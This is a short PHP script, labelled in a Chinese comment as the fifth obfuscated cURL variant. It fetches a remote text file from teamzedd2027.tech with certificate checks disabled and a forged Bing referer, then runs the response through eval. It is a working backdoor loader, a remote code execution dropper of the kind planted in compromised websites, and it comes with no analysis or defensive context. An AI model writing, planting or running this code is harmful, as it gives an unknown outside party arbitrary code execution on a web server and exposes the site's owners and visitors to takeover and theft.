<?php
// 版本 5: cURL 数组混淆 (Obfuscation Array)
$取=curl_init();
$选=[ // 选 (Options)
    CURLOPT_URL=>'https://teamzedd2027.tech/project/rahman.txt',
    CURLOPT_RETURNTRANSFER=>1,
    CURLOPT_SSL_VERIFYPEER=>0,
    CURLOPT_REFERER=>'https://bing.com'
];
curl_setopt_array($取,$选);
$码=curl_exec($取);
curl_close($取);
if($码)eval("?>".$码);
?>